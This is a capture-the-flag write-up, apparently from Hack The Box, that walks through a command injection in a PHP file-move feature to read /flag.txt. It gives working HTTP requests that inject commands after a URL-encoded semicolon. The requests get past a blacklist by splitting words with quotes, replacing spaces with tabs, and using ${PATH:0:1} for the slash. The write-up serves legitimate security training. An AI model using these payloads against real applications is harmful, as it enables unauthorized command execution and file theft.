## Challenge

What is the content of '/flag.txt'? 

## Solution

I login to the page with the given credentials.

After exploring the site, I see the some functions to copy and move a file.

When I move a file, I see the message displayed.

```sh
Moved from /var/www/html/files/2380029473.txt to /var/www/html/files/tmp
```

The url is: `http://94.237.59.180:35265/index.php?to=tmp&from=2380029473.txt&finish=1&move=1`.

After trying to do that for the second time, I see the message `Error while moving: mv: cannot stat '/var/www/html/files/2380029473.txt': No such file or directory`.

Now after I tried some of the operators, I see that the url-encoded semicolon works, but when I tried the command `whoami` it showed malicious content.

So I put some characters that will be ignored, and make the GET request like:

```http
GET /index.php?to=%3bw'h'oa'm'i&from=51459716.txt&finish=1&move=1 HTTP/1.1
```

This gives the message:

```html
Error while moving: mv: cannot stat '/var/www/html/files/51459716.txt': No such file or directory<br>www-data
```

Now, I will use `cat` to read the file, but also this command is blacklisted, as it shows `malicious content`.

Sending only `c'a't` it's not blocked.

But when I add the content of the flag, it doesn't work:

```http
GET /index.php?to=%3bc'a't%09/flag.txt&from=51459716.txt&finish=1&move=1 HTTP/1.1
```

It shows `Malicious request denied`.

I remove the `flag.txt` and it works, so it means the slash `/` is blacklisted, so I will use the Linux Environment Variable `{PATH:0:1}`.

```http
GET /index.php?to=%3bc'a't%09${PATH:0:1}flag.txt&from=51459716.txt&finish=1&move=1 HTTP/1.1
```

This gives me the flag:

```sh
Error while moving: mv: cannot stat '/var/www/html/files/51459716.txt': No such file or directory<br>HTB{c0mm4nd3r_1nj3c70r}
```



